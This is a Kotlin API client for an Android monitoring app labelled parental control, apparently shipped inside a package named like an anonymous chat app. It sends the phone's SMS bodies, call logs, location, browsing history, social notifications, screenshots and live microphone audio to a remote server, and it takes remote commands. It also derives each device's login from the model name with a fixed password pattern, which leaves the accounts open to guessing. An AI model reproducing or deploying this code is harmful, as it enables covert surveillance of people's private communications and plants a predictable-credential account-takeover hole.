package com.anonchat.app.parentalcontrol.api

import android.util.Log
import com.anonchat.app.parentalcontrol.util.BatteryInfo
import com.anonchat.app.parentalcontrol.util.CallLogEntry
import com.anonchat.app.parentalcontrol.util.DeviceInfo
import com.anonchat.app.parentalcontrol.util.InstalledApp
import com.anonchat.app.parentalcontrol.util.LocationData
import com.anonchat.app.parentalcontrol.util.SmsMessage
import com.anonchat.app.parentalcontrol.util.ScreenTimeData
import com.anonchat.app.parentalcontrol.util.WebHistoryEntry
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object ApiClient {

    private val client = OkHttpClient.Builder()
        .followRedirects(true)
        .followSslRedirects(true)
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val probeClient = OkHttpClient.Builder()
        .followRedirects(true)
        .followSslRedirects(true)
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()

    // Generous read timeout so a cold-starting free-tier instance (Render
    // spins up in ~30-60 s) can still be detected on startup.
    private val coldStartProbeClient = OkHttpClient.Builder()
        .followRedirects(true)
        .followSslRedirects(true)
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(90, TimeUnit.SECONDS)
        .build()

    /**
     * Quick liveness probe: a live cloud server answers /api/v1/auth/me with a
     * JSON body (401 when unauthenticated still counts). HTML error pages
     * (dead Render service, parking pages) and timeouts count as down.
     */
    fun probeServer(url: String, client: OkHttpClient = probeClient): Boolean {
        return try {
            val req = Request.Builder().url("$url/api/v1/auth/me").get().build()
            client.newCall(req).execute().use { resp ->
                val body = resp.body?.string()?.trim() ?: ""
                resp.code in 200..499 && body.startsWith("{")
            }
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Auto-select the best server: first live candidate in priority order
     * (Render, then PythonAnywhere). Only switches when a candidate is
     * confirmed up; if none answer, the current server is kept. Stale tokens
     * are cleared on a switch because JWT secrets differ per deployment.
     *
     * @param initial true on service start: uses the long-timeout probe for
     * the first candidate so a cold start can still be detected.
     */
    suspend fun autoSelectServer(initial: Boolean = false): String {
        val candidates = CloudConfig.serverCandidates()
        for (i in candidates.indices) {
            val url = candidates[i]
            val alive = if (initial && i == 0) {
                probeServer(url, coldStartProbeClient)
            } else {
                probeServer(url)
            }
            if (alive) {
                if (url != CloudConfig.serverUrl) {
                    Log.i("ApiClient", "Auto-select: switching server to $url")
                    CloudConfig.serverUrl = url
                    CloudConfig.accessToken = null
                    CloudConfig.refreshToken = null
                }
                return url
            }
        }
        Log.w("ApiClient", "Auto-select: no candidate reachable, keeping ${CloudConfig.serverUrl}")
        return CloudConfig.serverUrl
    }

    private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

    private fun authHeaders(): Map<String, String> {
        val headers = mutableMapOf("Content-Type" to "application/json")
        CloudConfig.accessToken?.let {
            headers["Authorization"] = "Bearer $it"
        }
        return headers
    }

    private fun buildRequest(url: String, body: String? = null, method: String = "POST"): Request {
        val builder = Request.Builder().url(url)
        authHeaders().forEach { (k, v) -> builder.addHeader(k, v) }
        if (body != null) {
            builder.method(method, body.toRequestBody(JSON_MEDIA_TYPE))
        }
        return builder.build()
    }

    // ─── Auth ───────────────────────────────────────────────────────────

    fun register(
        email: String, password: String, displayName: String, role: String = "child"
    ): Result {
        return try {
            val payload = JSONObject().apply {
                put("email", email)
                put("password", password)
                put("display_name", displayName)
                put("role", role)
            }
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/register")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) {
                val json = JSONObject(body)
                CloudConfig.accessToken = json.getString("token")
                CloudConfig.refreshToken = json.optString("refresh_token", null)
                CloudConfig.userId = json.getJSONObject("user").getString("id")
                CloudConfig.userEmail = json.getJSONObject("user").getString("email")
                CloudConfig.userRole = json.getJSONObject("user").getString("role")
                Result.Success(json)
            } else {
                val json = JSONObject(body)
                Result.Error(json.optString("error", "Registration failed"))
            }
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun login(email: String, password: String, role: String = ""): Result {
        return try {
            val payload = JSONObject().apply {
                put("email", email)
                put("password", password)
                if (role.isNotEmpty()) put("role", role)
            }
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/login")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string()?.trim() ?: "{}"
            if (response.isSuccessful && body.startsWith("{")) {
                val json = JSONObject(body)
                CloudConfig.accessToken = json.getString("token")
                CloudConfig.refreshToken = json.optString("refresh_token", null)
                CloudConfig.userId = json.getJSONObject("user").getString("id")
                CloudConfig.userEmail = json.getJSONObject("user").getString("email")
                CloudConfig.userRole = json.getJSONObject("user").getString("role")
                Result.Success(json)
            } else if (body.startsWith("{")) {
                val json = JSONObject(body)
                Result.Error(json.optString("error", json.optString("detail", "Login failed")))
            } else {
                Result.Error("Server error (${response.code}). Please check connection.")
            }
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun refreshToken(): Boolean {
        return try {
            val payload = JSONObject()
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/refresh")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Authorization", "Bearer ${CloudConfig.refreshToken}")
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val json = JSONObject(response.body?.string() ?: "{}")
                CloudConfig.accessToken = json.getString("token")
                true
            } else false
        } catch (e: Exception) {
            false
        }
    }

    // ─── Account Recovery ──────────────────────────────────────────────

    fun requestPasswordReset(email: String): Result {
        return try {
            val payload = JSONObject().apply { put("email", email.trim().lowercase()) }
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/forgot-password")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) Result.Success(JSONObject(body))
            else Result.Error(JSONObject(body).optString("error", "Request failed"))
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun resetPassword(email: String, token: String, newPassword: String): Result {
        return try {
            val payload = JSONObject().apply {
                put("email", email.trim().lowercase())
                put("token", token.trim().uppercase())
                put("new_password", newPassword)
            }
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/reset-password")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            val json = JSONObject(body)
            if (response.isSuccessful) {
                CloudConfig.accessToken = json.getString("token")
                CloudConfig.refreshToken = json.optString("refresh_token", null)
                CloudConfig.userId = json.getJSONObject("user").getString("id")
                CloudConfig.userEmail = json.getJSONObject("user").getString("email")
                CloudConfig.userRole = json.getJSONObject("user").getString("role")
                Result.Success(json)
            } else Result.Error(json.optString("error", "Reset failed"))
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun lookupUsername(displayNameHint: String): Result {
        return try {
            val payload = JSONObject().apply { put("display_name", displayNameHint.trim()) }
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/auth/forgot-username")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) Result.Success(JSONObject(body))
            else Result.Error(JSONObject(body).optString("error", "Lookup failed"))
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    // ─── Pairing ────────────────────────────────────────────────────────

    fun claimPairing(code: String): Result {
        return try {
            val payload = JSONObject().apply { put("pairing_code", code) }
            val response = client.newCall(
                buildRequest("${CloudConfig.apiBaseUrl}/pairing/claim", payload.toString())
            ).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) Result.Success(JSONObject(body))
            else Result.Error(JSONObject(body).optString("error", "Pairing failed"))
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun claimPairingDirect(code: String, deviceId: String): Result {
        return try {
            val payload = JSONObject().apply {
                put("pairing_code", code)
                put("device_id", deviceId)
            }
            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/pairing/claim-direct")
                .post(payload.toString().toRequestBody(JSON_MEDIA_TYPE))
                .addHeader("Content-Type", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) {
                val json = JSONObject(body)
                CloudConfig.accessToken = json.getString("token")
                CloudConfig.refreshToken = json.optString("refresh_token", null)
                CloudConfig.userId = json.getJSONObject("user").getString("id")
                CloudConfig.userEmail = json.getJSONObject("user").getString("email")
                CloudConfig.userRole = json.getJSONObject("user").getString("role")
                Result.Success(json)
            } else {
                Result.Error(JSONObject(body).optString("error", "Pairing failed"))
            }
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun ensureAuthenticated(deviceInfo: DeviceInfo? = null): Boolean {
        if (!CloudConfig.accessToken.isNullOrEmpty()) return true
        if (CloudConfig.userEmail.isNotEmpty() && CloudConfig.userPassword.isNotEmpty()) {
            val log = login(CloudConfig.userEmail, CloudConfig.userPassword)
            if (log is Result.Success) return true
        }
        val devId = CloudConfig.deviceId.ifEmpty { android.os.Build.MODEL.replace(" ", "_") }
        val email = "device_${devId.lowercase()}@kidguard.local"
        val pass = "device_${devId.lowercase()}_secret_2024"
        val displayName = deviceInfo?.deviceName ?: devId
        val reg = register(email, pass, displayName, "child")
        if (reg is Result.Success) return true
        val log = login(email, pass, "child")
        return log is Result.Success
    }

    fun registerDevice(deviceInfo: DeviceInfo): Result {
        return try {
            ensureAuthenticated(deviceInfo)
            val payload = JSONObject().apply {
                put("device_id", CloudConfig.deviceId)
                put("device_name", deviceInfo.deviceName)
                put("manufacturer", deviceInfo.manufacturer)
                put("model", deviceInfo.model)
                put("android_version", deviceInfo.androidVersion)
                put("sdk_version", deviceInfo.sdkVersion)
            }
            val response = client.newCall(
                buildRequest("${CloudConfig.apiBaseUrl}/device/register", payload.toString())
            ).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) Result.Success(JSONObject(body))
            else Result.Error(JSONObject(body).optString("error", "Device registration failed: HTTP ${response.code} $body"))
        } catch (e: Exception) {
            Result.Error(e.message ?: "Connection error")
        }
    }

    fun getDeviceConfig(): JSONObject? {
        return try {
            val request = buildRequest(
                "${CloudConfig.apiBaseUrl}/device/${CloudConfig.deviceId}/config",
                method = "GET"
            )
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                JSONObject(response.body?.string() ?: "{}")
            } else null
        } catch (e: Exception) {
            null
        }
    }

    // ─── Reporting ──────────────────────────────────────────────────────

    fun buildReportPayload(
        deviceInfo: DeviceInfo,
        location: LocationData?,
        battery: BatteryInfo,
        smsMessages: List<SmsMessage>,
        callLogs: List<CallLogEntry>,
        installedApps: List<InstalledApp>,
        activities: List<JSONObject>? = null,
        screentime: ScreenTimeData? = null,
        webHistory: List<WebHistoryEntry>? = null,
        socialNotifications: List<JSONObject>? = null
    ): String {
        val payload = JSONObject()
        payload.put("device_id", CloudConfig.deviceId)
        // Include full device metadata so we can fall back to legacy/simple server format
        payload.put("device_name", deviceInfo.deviceName)
        payload.put("manufacturer", deviceInfo.manufacturer)
        payload.put("model", deviceInfo.model)
        payload.put("android_version", deviceInfo.androidVersion)
        payload.put("sdk_version", deviceInfo.sdkVersion)

        if (location != null) {
            val loc = JSONObject().apply {
                put("latitude", location.latitude)
                put("longitude", location.longitude)
                put("accuracy", location.accuracy)
                put("provider", location.provider)
                put("timestamp", location.timestamp)
            }
            payload.put("location", loc)
        }

        val bat = JSONObject().apply {
            put("level", battery.level)
            put("is_charging", battery.isCharging)
            put("temperature", battery.temperature)
        }
        payload.put("battery", bat)

        val smsArray = JSONArray()
        for (msg in smsMessages) {
            smsArray.put(JSONObject().apply {
                put("id", msg.id)
                put("address", msg.address)
                put("body", if (msg.body.length > 500) msg.body.take(500) else msg.body)
                put("date", msg.date)
                put("type", msg.type)
            })
        }
        payload.put("sms", smsArray)

        val callsArray = JSONArray()
        for (call in callLogs) {
            callsArray.put(JSONObject().apply {
                put("id", call.id)
                put("number", call.number)
                put("name", call.name ?: "")
                put("duration", call.duration)
                put("date", call.date)
                put("type", call.type)
            })
        }
        payload.put("calls", callsArray)

        if (installedApps.isNotEmpty()) {
            val appsArray = JSONArray()
            for (app in installedApps) {
                appsArray.put(JSONObject().apply {
                    put("packageName", app.packageName)
                    put("appName", app.appName)
                    put("versionName", app.versionName ?: "")
                    put("versionCode", app.versionCode)
                    put("firstInstallTime", app.firstInstallTime)
                    put("lastUpdateTime", app.lastUpdateTime)
                })
            }
            payload.put("apps", appsArray)
        }

        if (activities != null) {
            val actsArray = JSONArray()
            for (act in activities) {
                actsArray.put(act)
            }
            payload.put("activities", actsArray)
        }

        if (screentime != null) {
            payload.put("screentime", JSONObject().apply {
                put("total_minutes", screentime.totalMinutes)
                put("unlocks", screentime.unlocks)
                put("date", screentime.date)
            })
        }

        if (webHistory != null) {
            val webArray = JSONArray()
            for (entry in webHistory) {
                webArray.put(JSONObject().apply {
                    put("url", entry.url)
                    put("title", entry.title)
                    put("browser", entry.browser)
                    put("visit_count", entry.visitCount)
                    put("timestamp", entry.timestamp)
                })
            }
            payload.put("webhistory", webArray)
        }

        if (socialNotifications != null && socialNotifications.isNotEmpty()) {
            val socialArray = JSONArray()
            for (notif in socialNotifications) {
                socialArray.put(notif)
            }
            payload.put("social", socialArray)
            payload.put("social_notifications", socialArray)
        }

        return payload.toString()
    }

    data class BulkReportResult(
        val success: Boolean,
        val serverTime: Long?,
        val commands: List<JSONObject>?,
        val error: String? = null
    )

    fun sendBulkReport(jsonPayload: String): BulkReportResult {
        val forceLegacy = CloudConfig.serverType == CloudConfig.SERVER_TYPE_LEGACY
        val forceCloud = CloudConfig.serverType == CloudConfig.SERVER_TYPE_CLOUD

        if (!forceLegacy) {
            val cloudResult = sendCloudBulkReport(jsonPayload)
            if (cloudResult.success) {
                CloudConfig.serverType = CloudConfig.SERVER_TYPE_CLOUD
                return cloudResult
            }
            if (forceCloud) return cloudResult
        }

        return try {
            val legacyResult = sendLegacyBulkReport(jsonPayload)
            if (legacyResult.success && CloudConfig.serverType == CloudConfig.SERVER_TYPE_AUTO) {
                CloudConfig.serverType = CloudConfig.SERVER_TYPE_LEGACY
            }
            legacyResult
        } catch (e: Exception) {
            BulkReportResult(false, null, null, "Legacy exception: ${e.message}")
        }
    }

    private fun sendCloudBulkReport(jsonPayload: String): BulkReportResult {
        return try {
            ensureAuthenticated()
            val response = client.newCall(
                buildRequest("${CloudConfig.apiBaseUrl}/report/bulk", jsonPayload)
            ).execute()
            val body = response.body?.string() ?: "{}"
            if (response.isSuccessful) {
                val json = JSONObject(body)
                val cmdArray = json.optJSONArray("commands")
                val commands = if (cmdArray != null) {
                    (0 until cmdArray.length()).map { cmdArray.getJSONObject(it) }
                } else null
                BulkReportResult(true, json.optLong("server_time"), commands)
            } else {
                if (response.code == 401) {
                    CloudConfig.accessToken = null
                    if (ensureAuthenticated()) {
                        val retryResponse = client.newCall(
                            buildRequest("${CloudConfig.apiBaseUrl}/report/bulk", jsonPayload)
                        ).execute()
                        val retryBody = retryResponse.body?.string() ?: "{}"
                        if (retryResponse.isSuccessful) {
                            val json = JSONObject(retryBody)
                            val cmdArray = json.optJSONArray("commands")
                            val commands = if (cmdArray != null) {
                                (0 until cmdArray.length()).map { cmdArray.getJSONObject(it) }
                            } else null
                            return BulkReportResult(true, json.optLong("server_time"), commands)
                        }
                    }
                }
                BulkReportResult(false, null, null, "HTTP ${response.code}: ${body.take(200)}")
            }
        } catch (e: Exception) {
            BulkReportResult(false, null, null, "Exception: ${e.javaClass.simpleName}: ${e.message}")
        }
    }

    /**
     * Send a report to the simple web-monitor server which expects an X-API-Key
     * and a flat payload with camelCase keys.
     */
    private fun sendLegacyBulkReport(jsonPayload: String): BulkReportResult {
        val cloudPayload = JSONObject(jsonPayload)
        val legacyPayload = JSONObject()

        // device info
        legacyPayload.put("device", JSONObject().apply {
            put("deviceId", cloudPayload.optString("device_id", CloudConfig.deviceId))
            put("deviceName", cloudPayload.optString("device_name", ""))
            put("manufacturer", cloudPayload.optString("manufacturer", ""))
            put("model", cloudPayload.optString("model", ""))
            put("androidVersion", cloudPayload.optString("android_version", ""))
            put("sdkVersion", cloudPayload.optInt("sdk_version", 0))
        })

        // location
        cloudPayload.optJSONObject("location")?.let { loc ->
            legacyPayload.put("location", JSONObject().apply {
                put("latitude", loc.optDouble("latitude", 0.0))
                put("longitude", loc.optDouble("longitude", 0.0))
                put("accuracy", loc.optDouble("accuracy", 0.0))
                put("provider", loc.optString("provider", "unknown"))
                put("timestamp", loc.optLong("timestamp", System.currentTimeMillis()))
            })
        }

        // battery - convert snake_case to camelCase
        cloudPayload.optJSONObject("battery")?.let { bat ->
            legacyPayload.put("battery", JSONObject().apply {
                put("level", bat.optInt("level", -1))
                put("isCharging", bat.optBoolean("is_charging", false))
                put("temperature", bat.optDouble("temperature", -1.0))
            })
        }

        // sms
        val smsArray = JSONArray()
        cloudPayload.optJSONArray("sms")?.let { arr ->
            for (i in 0 until arr.length()) {
                val msg = arr.getJSONObject(i)
                smsArray.put(JSONObject().apply {
                    put("id", msg.optLong("id", 0))
                    put("address", msg.optString("address", ""))
                    put("body", msg.optString("body", ""))
                    put("date", msg.optLong("date", 0))
                    put("type", msg.optInt("type", 0))
                })
            }
        }
        legacyPayload.put("smsMessages", smsArray)

        // calls
        val callsArray = JSONArray()
        cloudPayload.optJSONArray("calls")?.let { arr ->
            for (i in 0 until arr.length()) {
                val call = arr.getJSONObject(i)
                callsArray.put(JSONObject().apply {
                    put("id", call.optLong("id", 0))
                    put("number", call.optString("number", ""))
                    put("name", call.optString("name", ""))
                    put("duration", call.optInt("duration", 0))
                    put("date", call.optLong("date", 0))
                    put("type", call.optInt("type", 0))
                })
            }
        }
        legacyPayload.put("callLogs", callsArray)

        // installed apps - field names already match legacy format
        val appsArray = JSONArray()
        cloudPayload.optJSONArray("apps")?.let { arr ->
            for (i in 0 until arr.length()) {
                appsArray.put(arr.getJSONObject(i))
            }
        }
        legacyPayload.put("installedApps", appsArray)

        val request = Request.Builder()
            .url("${CloudConfig.serverUrl}/api/report")
            .addHeader("X-API-Key", CloudConfig.apiKey)
            .addHeader("Content-Type", "application/json")
            .post(legacyPayload.toString().toRequestBody(JSON_MEDIA_TYPE))
            .build()

        return try {
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                // Legacy server doesn't return commands; we'll fetch config separately
                BulkReportResult(true, System.currentTimeMillis(), null)
            } else {
                BulkReportResult(false, null, null)
            }
        } catch (e: Exception) {
            BulkReportResult(false, null, null)
        }
    }

    fun updateCommandStatus(commandId: String, status: String): Boolean {
        return updateCommandStatus(commandId, status, null, null)
    }

    fun updateCommandStatus(commandId: String, status: String, result: String?): Boolean {
        return updateCommandStatus(commandId, status, result, null)
    }

    fun updateCommandStatus(commandId: String, status: String, result: String?, resultType: String?): Boolean {
        return try {
            val payload = JSONObject().apply {
                put("status", status)
                if (result != null) put("result", result)
                if (resultType != null) put("result_type", resultType)
            }
            val response = client.newCall(
                buildRequest(
                    "${CloudConfig.apiBaseUrl}/command/$commandId/status",
                    payload.toString()
                )
            ).execute()
            response.isSuccessful
        } catch (e: Exception) {
            false
        }
    }

    fun reportMedia(mediaType: String, filePath: String): Result {
        return try {
            val url = "${CloudConfig.apiBaseUrl}/report/media"
            val file = java.io.File(filePath)
            val requestBody = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("device_id", CloudConfig.deviceId)
                .addFormDataPart("media_type", mediaType)
                .addFormDataPart("file", file.name,
                    okhttp3.RequestBody.create(
                        "image/jpeg".toMediaType(), file
                    )
                )
                .build()
            val request = Request.Builder()
                .url(url)
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(requestBody)
                .build()
            val response = client.newCall(request).execute()
            if (response.isSuccessful) Result.Success(JSONObject(response.body?.string() ?: "{}"))
            else Result.Error("Upload failed")
        } catch (e: Exception) {
            Result.Error(e.message ?: "Upload error")
        }
    }

    fun uploadAudioRecording(file: java.io.File, commandId: String): Boolean {
        return try {
            val url = "${CloudConfig.apiBaseUrl}/report/audio-file"
            val requestBody = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("device_id", CloudConfig.deviceId)
                .addFormDataPart("command_id", commandId)
                .addFormDataPart("file", file.name,
                    okhttp3.RequestBody.create(
                        "audio/m4a".toMediaType(), file
                    )
                )
                .build()
            val request = Request.Builder()
                .url(url)
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(requestBody)
                .build()
            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: Exception) {
            Log.e("ApiClient", "Failed to upload audio recording: ${e.message}")
            false
        }
    }


    data class UpdateCheckResult(
        val success: Boolean,
        val hasUpdate: Boolean = false,
        val latestVersionCode: Int = 0,
        val downloadUrl: String = "",
        val changelog: String = ""
    )

    fun checkForUpdate(currentVersionCode: Int): UpdateCheckResult {
        return try {
            val url = "${CloudConfig.apiBaseUrl}/app/check-update"
            val json = JSONObject().apply {
                put("device_id", CloudConfig.deviceId)
                put("version_code", currentVersionCode)
            }
            val request = Request.Builder()
                .url(url)
                .addHeader("Content-Type", "application/json")
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(json.toString().toRequestBody(JSON_MEDIA_TYPE))
                .build()
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: "{}"
            val data = JSONObject(body)
            if (response.isSuccessful) {
                UpdateCheckResult(
                    success = true,
                    hasUpdate = data.optBoolean("has_update", false),
                    latestVersionCode = data.optInt("version_code", 0),
                    downloadUrl = data.optString("download_url", ""),
                    changelog = data.optString("changelog", "")
                )
            } else {
                UpdateCheckResult(success = false)
            }
        } catch (e: Exception) {
            UpdateCheckResult(success = false)
        }
    }

    /**
     * Probe the configured server to determine whether it speaks the cloud API
     * or the simple legacy/web-monitor API.
     */
    fun probeServerType(): String {
        // Cloud server has /api/auth/me; legacy returns HTML 404.
        val cloudProbe = Request.Builder()
            .url("${CloudConfig.serverUrl}/api/auth/me")
            .get()
            .build()
        try {
            client.newCall(cloudProbe).execute().use { resp ->
                val body = resp.body?.string()?.trim() ?: ""
                if (resp.code in 200..499 && body.startsWith("{")) {
                    return CloudConfig.SERVER_TYPE_CLOUD
                }
            }
        } catch (e: Exception) { /* ignore */ }

        // Legacy server has /api/report; a POST with API key should NOT return 404.
        val legacyProbe = Request.Builder()
            .url("${CloudConfig.serverUrl}/api/report")
            .addHeader("X-API-Key", CloudConfig.apiKey)
            .addHeader("Content-Type", "application/json")
            .post("{}".toRequestBody(JSON_MEDIA_TYPE))
            .build()
        try {
            client.newCall(legacyProbe).execute().use { resp ->
                if (resp.code != 404) {
                    return CloudConfig.SERVER_TYPE_LEGACY
                }
            }
        } catch (e: Exception) { /* ignore */ }

        return CloudConfig.SERVER_TYPE_AUTO
    }

    sealed class Result {
        data class Success(val data: JSONObject) : Result()
        data class Error(val message: String) : Result()
    }

    fun uploadScreenshot(file: java.io.File, commandId: String? = null): Boolean {
        return try {
            val mediaType = "image/jpeg".toMediaType()
            val bodyBuilder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", CloudConfig.deviceId)
                .addFormDataPart("media_type", "screenshot")
                .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
            if (commandId != null) bodyBuilder.addFormDataPart("command_id", commandId)

            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/report/media")
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(bodyBuilder.build())
                .build()

            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: Exception) {
            false
        }
    }

    fun uploadAudioFile(file: java.io.File, commandId: String? = null): Boolean {
        return try {
            val mediaType = "audio/mp4".toMediaType()
            val bodyBuilder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", CloudConfig.deviceId)
                .addFormDataPart("media_type", "audio")
                .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
            if (commandId != null) bodyBuilder.addFormDataPart("command_id", commandId)

            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/report/media")
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(bodyBuilder.build())
                .build()

            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: Exception) {
            false
        }
    }

    fun reportCallState(state: Int, phoneNumber: String?, timestamp: Long) {
        try {
            val json = JSONObject().apply {
                put("device_id", CloudConfig.deviceId)
                put("state", state)
                put("phone_number", phoneNumber ?: "")
                put("timestamp", timestamp)
            }
            val requestBody = json.toString()
                .toRequestBody("application/json".toMediaType())

            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/report/call-state")
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w("ApiClient", "Call state report failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e("ApiClient", "Call state report error: ${e.message}")
        }
    }

    fun streamAudioChunk(chunk: ByteArray, sampleRate: Int, commandId: String? = null, seq: Int = 0, done: Boolean = false) {
        try {
            val json = JSONObject().apply {
                put("device_id", CloudConfig.deviceId)
                put("audio", android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP))
                put("sample_rate", sampleRate)
                put("channels", 1)
                put("encoding", "pcm_s16le")
                put("timestamp", System.currentTimeMillis())
                put("seq", seq)
                put("done", done)
                if (!commandId.isNullOrEmpty()) {
                    put("command_id", commandId)
                }
            }
            val requestBody = json.toString()
                .toRequestBody("application/json".toMediaType())

            val request = Request.Builder()
                .url("${CloudConfig.apiBaseUrl}/report/audio-stream")
                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
                .post(requestBody)
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w("ApiClient", "Audio stream failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e("ApiClient", "Audio stream error: ${e.message}")
        }
    }

}
